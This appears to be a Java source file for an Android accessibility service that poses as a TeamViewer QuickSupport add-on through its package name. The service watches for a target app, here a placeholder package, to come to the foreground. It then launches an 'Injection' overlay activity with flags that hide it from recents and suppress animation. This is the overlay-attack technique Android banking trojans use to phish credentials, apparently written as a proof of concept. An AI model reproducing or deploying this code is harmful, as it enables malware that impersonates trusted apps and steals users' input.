package com.teamviewer.quicksupport.addon.universal;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.util.Log;

import android.view.accessibility.AccessibilityEvent;

import com.example.overlay.Injection;
import com.example.overlay.InjectionState;


public class TvAccessibilityService extends AccessibilityService {

    private static final String TARGET = "com.example.lifecyclestats";
    private static final String TAG = "ACCCCxxx";
    private InjectionState iState = InjectionState.getInstance();

    private static void log(String m){
        Log.v(TAG, m);
    }

    private static void log(boolean m){
        Log.v(TAG, String.valueOf(m));
    }

    @Override
    protected void onServiceConnected() {
        log("MyAccessibilityService.onServiceConnected()");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        try {
            log(event.getPackageName().toString());
            if(event.getPackageName().toString().equals(TARGET) && !iState.isInjectionInProgress()){
                log("Injection start target:" + TARGET);
                iState.setInjectionInProgress(true);
                Intent dialogIntent = new Intent(this, Injection.class);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                startActivity(dialogIntent);


            }else{
                log("Injection finish target:" + TARGET);
                iState.setInjectionInProgress(false);
            }
        }catch (Exception ex){
            log("No package name in acc event");
        }
    }

    @Override
    public void onInterrupt() {
        log("MyAccessibilityService.onInterrupt()");
    }
}

